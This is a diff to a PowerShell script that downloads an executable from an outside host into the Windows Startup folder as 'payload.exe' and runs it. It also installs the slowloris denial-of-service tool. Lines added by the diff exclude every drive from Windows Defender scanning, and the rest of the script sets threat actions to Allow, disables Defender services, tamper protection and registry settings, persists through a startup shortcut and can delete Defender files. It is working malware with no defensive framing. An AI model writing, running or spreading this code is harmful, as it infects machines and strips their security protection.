@@ -9,14 +9,9 @@ Start-Process -FilePath "cmd.exe" -ArgumentList "/K pip install slowloris" -Wind
 
 $startupFolder = Join-Path $env:USERPROFILE "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $payloadUrl = "https://khumoyun.uz/res/win7/main.exe"
-Invoke-WebRequest -Uri $payloadUrl -OutFile (Join-Path $startupFolder "payload.exe")
+Invoke-WebRequest -Uri $payloadUrl -OutFile (Join-Path $startupFolder "payload.exe") -UseBasicParsing
 
 Start-Process -FilePath "$startupFolder\payload.exe"
-
-
-
-## STEP 0 : elevate if needed
-
 
 if(-Not $($(whoami) -eq "nt authority\system")) {
     $IsSystem = $false
@@ -43,8 +38,11 @@ if(-Not $($(whoami) -eq "nt authority\system")) {
 } else {
     $IsSystem = $true
 }
-
-
+67..90|foreach-object{
+    $drive = [char]$_
+    Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
+}
 
 Write-Host "    [+] Disable scanning engines (Set-MpPreference)"
 
@@ -64,13 +62,6 @@ Write-Host "    [+] Set default actions to Allow (Set-MpPreference)"
 Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
-
-
-## STEP 2 : Disable services, we cannot stop them, but we can disable them (they won't start next reboot)
-
-
-Write-Host "    [+] Disable services"
-
 $need_reboot = $false
 
 # WdNisSvc Network Inspection Service 
@@ -120,20 +111,15 @@ if($(GET-Service -Name WinDefend).Status -eq "Running") {
 } else {
     Write-Host "    [+] WinDefend Service not running"
 }
-
-
-## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)
-
-
 $link_reboot = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\disable-defender.lnk"
 Remove-Item -Force "$link_reboot" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)
 
 if($need_reboot) {
     Write-Host "    [+] This script will be started again after reboot." -BackgroundColor DarkRed -ForegroundColor White
-    
+
     $powershell_path = '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
     $cmdargs = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
-    
+
     $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force
     $WshShell = New-Object -comObject WScript.Shell
     $shortcut = $WshShell.CreateShortcut($link_reboot)
@@ -141,13 +127,7 @@ if($need_reboot) {
     $shortcut.Arguments = $cmdargs
     $shortcut.WorkingDirectory = "$(Split-Path -Path $PSScriptRoot -Parent)"
     $shortcut.Save()
-
 } else {
-
-
-    ## STEP 4 : After reboot (we checked that everything was successfully disabled), make sure it doesn't come up again !
-
-
     if($IsSystem) {
 
         # Configure the Defender registry to disable it (and the TamperProtection)
@@ -161,7 +141,7 @@ if($need_reboot) {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
         # Tamper protection
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
-        
+
         # Disable in registry
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
@@ -172,7 +152,7 @@ if($need_reboot) {
 
 
     if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains("-delete"))) {
-        
+
         # Delete Defender files
 
         function Delete-Show-Error {
@@ -205,3 +185,4 @@ if($need_reboot) {
         }
     }
 }
+Write-Host "Script Finished" -foregroundcolor Yellow
